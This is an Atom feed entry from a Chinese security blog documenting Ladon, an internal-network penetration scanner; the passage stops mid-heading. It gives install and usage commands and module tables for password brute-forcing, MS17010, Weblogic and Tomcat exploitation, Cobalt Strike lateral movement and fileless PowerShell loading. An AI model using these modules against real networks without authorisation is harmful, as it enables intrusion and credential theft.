<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K8哥哥’s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://k8gege.org/"/>
  <updated>2020-03-29T17:01:09.849Z</updated>
  <id>http://k8gege.org/</id>
  
  <author>
    <name>K8gege</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ladon大型内网渗透扫描器&amp;Cobalt Strike 4.0</title>
    <link href="http://k8gege.org/p/648af4b3.html"/>
    <id>http://k8gege.org/p/648af4b3.html</id>
    <published>2020-03-28T15:10:24.000Z</published>
    <updated>2020-03-29T17:01:09.849Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.2-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p><h3 id="Ladon-for-Windows"><a href="#Ladon-for-Windows" class="headerlink" title="Ladon for Windows"></a>Ladon for Windows</h3><p><img data-original="http://k8gege.org/k8img/Ladon/Ladon.gif"></p><h3 id="Ladon-GUI"><a href="#Ladon-GUI" class="headerlink" title="Ladon GUI"></a>Ladon GUI</h3><p><img data-original="http://k8gege.org/k8img/Ladon/LadonGUI.gif"></p><h3 id="Ladon-for-Cobalt-Strike"><a href="#Ladon-for-Cobalt-Strike" class="headerlink" title="Ladon for Cobalt Strike"></a>Ladon for Cobalt Strike</h3><p><img data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p><h3 id="Ladon-for-PowerShell"><a href="#Ladon-for-PowerShell" class="headerlink" title="Ladon for PowerShell"></a>Ladon for PowerShell</h3><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p><h3 id="Python-Ladon"><a href="#Python-Ladon" class="headerlink" title="Python Ladon"></a>Python Ladon</h3><p><img data-original="http://k8gege.org/k8img/Ladon//py/PyLadon.PNG"></p><h3 id="Ladon-for-Linux"><a href="#Ladon-for-Linux" class="headerlink" title="Ladon for Linux"></a>Ladon for Linux</h3><p><img data-original="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table><thead><tr><th>ID</th><th>主题</th><th>URL</th></tr></thead><tbody><tr><td>1</td><td>Ladon文档主页</td><td><a href="https://github.com/k8gege/Ladon/wiki" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki</a></td></tr><tr><td>2</td><td>基础用法详解</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a></td></tr><tr><td>3</td><td>Cobalt Strike</td><td><a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a></td></tr><tr><td>4</td><td>Exp生成器使用</td><td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td></tr><tr><td>5</td><td>高度自定义插件</td><td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td></tr><tr><td>6</td><td>外部模块参考</td><td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td></tr><tr><td>7</td><td>PowerLadon</td><td><a href="https://github.com/k8gege/powerladon" target="_blank" rel="noopener">https://github.com/k8gege/powerladon</a></td></tr><tr><td>8</td><td>PythonLadon</td><td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td></tr><tr><td>9</td><td>LinuxLadon</td><td><a href="https://github.com/k8gege/KaliLadon" target="_blank" rel="noopener">https://github.com/k8gege/KaliLadon</a></td></tr><tr><td>10</td><td>漏洞演示视频</td><td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td></tr><tr><td>11</td><td>Ladon6.0文档</td><td><a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a></td></tr></tbody></table><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>git clone <a href="https://github.com/k8gege/Ladon.git" target="_blank" rel="noopener">https://github.com/k8gege/Ladon.git</a><br><br>使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE<br></p><h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br><br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe<br></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br><br>但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br><br>漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br><br>对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br><br>因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。<br></p><h3 id="关于Ladon-拉冬"><a href="#关于Ladon-拉冬" class="headerlink" title="关于Ladon(拉冬)"></a>关于Ladon(拉冬)</h3><p>Ladon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。<br><br>Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着<br><br>杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主<br><br>为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着<br><br>可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。<br></p><h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。6.2版本内置58个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p><h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br><br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具<br></p><h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)<br><br>如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br><br>Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透<br></p><h4 id="Linux、Mac"><a href="#Linux、Mac" class="headerlink" title="Linux、Mac"></a>Linux、Mac</h4><p>安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install mono-runtime</span><br><span class="line">wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon</span><br><span class="line">mono Ladon 192.168.1.8/24 OnlinePC</span><br></pre></td></tr></table></figure><p>由于mono的兼容性，不保证Mac或Linux下所有功能均可用<br><br>就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br><br>测试发现有些功能的稳定性以及速度没有Windows系统快<br><br>未列功能系未测试或暂不可用功能，使用前请先看说明<br></p><p>实测：在Kali 2019下可使用功能较多，Ubuntu兼容性比不上Kali，MacOS未对所有功能进行测试<br></p><h3 id="奇葩条件"><a href="#奇葩条件" class="headerlink" title="奇葩条件"></a>奇葩条件</h3><p>实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标<br><br>有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了<br><br>Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧<br><br>还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的<br></p><h3 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨"></a>宗旨</h3><p>为用户提供一个简单易用、功能丰富、高度灵活、可定制的扫描工具，减少大量重复操作提高工作效率<br></p><h3 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h3><p>扫描流量小<br><br>程序体积小<br><br>功能丰富强大<br><br>程序简单易用<br><br>插件支持多种语言<br><br>跨平台(Win/Kali/Ubuntu)等<br><br>支持Cobalt Strike插件化<br><br>支持PowerShell无文件渗透<br><br>Exp生成器可一键定制Poc<br><br>多版本适用各种环境<br></p><h3 id="程序参数功能"><a href="#程序参数功能" class="headerlink" title="程序参数功能"></a>程序参数功能</h3><p>1  支持指定IP扫描<br><br>2  支持指定域名扫描<br><br>3  支持指定机器名扫描<br><br>4  支持指定C段扫描(ip/24)<br><br>5  支持指定B段扫描(ip/16)<br><br>6  支持指定A段扫描(ip/8)<br><br>7  支持指定URL扫描<br><br>8  支持批量IP扫描(ip.txt)<br><br>9  支持批量C段扫描(ip24.txt)<br><br>10 支持批量B段扫描(ip16.txt)<br><br>11 支持批量URL扫描(url.txt)<br><br>12 支持批量域名扫描(domain.txt)<br><br>13 支持批量机器名扫描(host.txt)<br><br>14 支持批量字符串列表(str.txt)<br><br>15 支持主机帐密列表(check.txt)<br><br>16 支持用户密码列表(userpass.txt)<br><br>17 支持指定范围C段扫描<br><br>18 支持参数加载自定义DLL（仅限C#）<br><br>19 支持参数加载自定义EXE（仅限C#）<br><br>20 支持参数加载自定义INI配置文件<br><br>21 支持参数加载自定义PowerShell<br><br>22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br><br>23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br><br>24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br><br>25 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等<br><br>26 INI配置支持自定义程序密码爆破<br></p><h3 id="内置功能模块-58"><a href="#内置功能模块-58" class="headerlink" title="内置功能模块(58)"></a>内置功能模块(58)</h3><h4 id="0x001-资产扫描-10"><a href="#0x001-资产扫描-10" class="headerlink" title="0x001 资产扫描(10)"></a>0x001 资产扫描(10)</h4><p>例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)<br><br>例子: Ladon 192.168.1.8/24 OnlinePC<br></p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a></td><td>存活主机扫描</td><td>存活IP、Mac地址、机器名、设备制造商</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlineIP</a></td><td>仅存活主机IP</td><td>存活IP</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E5%9F%9F%E5%90%8DURL%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">UrlScan</a></td><td>URL域名扫描</td><td>同服URL（不验证IP、域名、Web标题）</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E6%97%81%E7%AB%99%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">SameWeb</a></td><td>同服域名扫描</td><td>同服URL（验证IP、域名、Web标题）</td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebScan</a></td><td>Web信息扫描</td><td>存活IP、主机名、Banner、Web标题</td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">WebDir</a></td><td>后台目录扫描</td><td>地址、HTTP状态</td></tr><tr><td>7</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4" target="_blank" rel="noopener">SubDomain</a></td><td>子域名爆破</td><td>子域名 (可用DomainIP/HostIP解析)</td></tr><tr><td>8</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">DomainIP</a></td><td>域名解析IP</td><td>域名、IP</td></tr><tr><td>9</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">HostIP</a></td><td>主机名转IP</td><td>IP、域名</td></tr><tr><td>10</td><td><a href>AdiDnsDump</a></td><td>域内机器信息获取(非域内请使用LdapScan探测)</td><td>IP、域名</td></tr></tbody></table><h4 id="0x002-指纹识别-服务识别-8"><a href="#0x002-指纹识别-服务识别-8" class="headerlink" title="0x002 指纹识别/服务识别(8)"></a>0x002 指纹识别/服务识别(8)</h4><p>例子: Ladon OsScan<br><br>例子: Ladon 192.168.1.8/24 OsScan<br></p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B" target="_blank" rel="noopener">OsScan</a></td><td>操作系统版本探测</td><td>存活IP、工作组\机器名、操作系统、</td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB)" target="_blank" rel="noopener">PortScan</a></td><td>端口扫描含Banner</td><td>主机名、开放端口、服务识别、Banner、Web标题</td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB" target="_blank" rel="noopener">WhatCMS</a></td><td>75种Web指纹识别</td><td>URL、CMS、邮件系统、登陆页面、中间件(如Apache\Tomecat\IIS)等</td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">CiscoScan</a></td><td>思科设备扫描</td><td>存活IP、设备型号、主机名、Boot、硬件版本</td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E5%86%85%E7%BD%91MSSQL%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">EnumMssql</a></td><td>枚举Mssql数据库主机</td><td>数据库IP、机器名、SQL版本</td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90" target="_blank" rel="noopener">EnumShare</a></td><td>枚举网络共享资源</td><td>域、存活IP、共享路径</td></tr><tr><td>7</td><td><a href>LdapScan</a></td><td>不指定密码时，仅探测LDAP服务器</td><td>IP是否LDAP服务器</td></tr><tr><td>8</td><td><a href>FtpScan</a></td><td>不指定密码时，仅探测FTP服务器</td><td>IP是否FTP服务器</td></tr></tbody></table><h4 id="0x003-口令检测-密码爆破-16"><a href="#0x003-口令检测-密码爆破-16" class="headerlink" title="0x003 口令检测/密码爆破(16)"></a>0x003 口令检测/密码爆破(16)</h4><p>[自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)]<br></p><p>例子: Ladon SshScan<br><br>例子: Ladon 192.168.1.8/24 SshScan<br><br>例子: Ladon 192.168.1.8:22 SshScan (指定端口)<br><br>例子: Ladon test.rar RarScan<br></p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>返回结果</th><th>依赖</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-SmbScan(Windows)" target="_blank" rel="noopener">SmbScan</a></td><td>SMB密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-WmiScan(Windows)" target="_blank" rel="noopener">WmiScan</a></td><td>Wmi密码爆破(Windowns)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%B4%E7%88%86%E7%A0%B4-IpcScan(Windows)" target="_blank" rel="noopener">IpcScan</a></td><td>Ipc密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>4</td><td><a href="http://k8gege.org/p/56393.html">LdapScan</a></td><td>AD域密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>5</td><td><a href="http://k8gege.org/">SmbHashScan</a></td><td>SMB HASH密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>6</td><td><a href="http://k8gege.org/">WmiHashScan</a></td><td>WMI HASH密码爆破(Windows)</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>7</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-SSHscan(Linux)" target="_blank" rel="noopener">SshScan</a></td><td>SSH密码爆破(Linux)</td><td>检测过程、成功密码、LOG文件</td><td>Renci.SshNet.dll</td></tr><tr><td>8</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">MssqlScan</a></td><td>Mssql数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>9</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Oracle%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">OracleScan</a></td><td>Oracle数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>DDTek.Oracle.dll</td></tr><tr><td>10</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">MysqlScan</a></td><td>Mysql数据库密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>MySql.Data.dll</td></tr><tr><td>11</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Weblogic%E5%AF%86%E7%A0%81%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">WeblogicScan</a></td><td>Weblogic后台密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>12</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-VNC%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2" target="_blank" rel="noopener">VncScan</a></td><td>VNC远程桌面密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>VncSharp.dll</td></tr><tr><td>13</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-FTP%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">FtpScan</a></td><td>Ftp服务器密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>14</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-Rar%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3" target="_blank" rel="noopener">RarScan</a></td><td>Rar压缩包密码爆破</td><td>检测过程、成功密码、LOG文件</td><td>Rar.exe</td></tr><tr><td>15</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-TomcatScan%E6%A8%A1%E5%9D%97Tomcat%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">TomcatScan</a></td><td>Tomcat后台登陆密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr><tr><td>16</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-HttpBasicScan%E6%A8%A1%E5%9D%97phpMyAdmin%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">HttpBasicScan</a></td><td>HttpBasic401认证密码爆破</td><td>检测过程、成功密码、LOG文件</td><td></td></tr></tbody></table><h4 id="0x004-漏洞检测-漏洞利用-8"><a href="#0x004-漏洞检测-漏洞利用-8" class="headerlink" title="0x004 漏洞检测/漏洞利用(8)"></a>0x004 漏洞检测/漏洞利用(8)</h4><p>例子: Ladon MS17010<br><br>例子: Ladon 192.168.1.8/24 MS17010<br><br>例子: Ladon <a href="http://192.168.1.8" target="_blank" rel="noopener">http://192.168.1.8</a> WeblogicExp<br></p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-MS17010%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">MS17010</a></td><td>SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148)<br></td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicPoc</a></td><td>Weblogic漏洞检测(CVE-2019-2725/<a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">CVE-2018-2894</a>)<br></td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">PhpStudyPoc</a></td><td>PhpStudy后门检测(phpstudy 2016/phpstudy 2018)<br></td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F--CVE-2016-3088" target="_blank" rel="noopener">ActivemqPoc</a></td><td>ActiveMQ漏洞检测(CVE-2016-3088) <br></td></tr><tr><td>5</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2017-12615" target="_blank" rel="noopener">TomcatPoc</a></td><td>Tomcat漏洞检测(CVE-2017-12615)<br></td></tr><tr><td>6</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-2725-Weblogic-GetShell-Exploit" target="_blank" rel="noopener">WeblogicExp</a></td><td>Weblogic漏洞利用(CVE-2019-2725)<br></td></tr><tr><td>7</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2017-12615" target="_blank" rel="noopener">TomcatExp</a></td><td>Tomcat漏洞利用(CVE-2017-12615)<br></td></tr><tr><td>8</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-Struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B" target="_blank" rel="noopener">Struts2Poc</a></td><td>Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)<br></td></tr></tbody></table><h4 id="0x005-加密解密-4"><a href="#0x005-加密解密-4" class="headerlink" title="0x005 加密解密(4)"></a>0x005 加密解密(4)</h4><p>例子: Ladon 字符串 EnHex<br><br>例子: Ladon EnHex (批量str.txt)<br></p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnHex</a></td><td>批量Hex密码加密<br></td></tr><tr><td>2</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FHex%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">DeHex</a></td><td>批量Hex密码解密<br></td></tr><tr><td>3</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">EnBase64</a></td><td>批量Base64密码加密<br></td></tr><tr><td>4</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86-%E6%89%B9%E9%87%8FBase64%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">DeBase64</a></td><td>批量Base64密码解密<br></td></tr></tbody></table><h4 id="0x006-下载功能-2"><a href="#0x006-下载功能-2" class="headerlink" title="0x006 下载功能(2)"></a>0x006 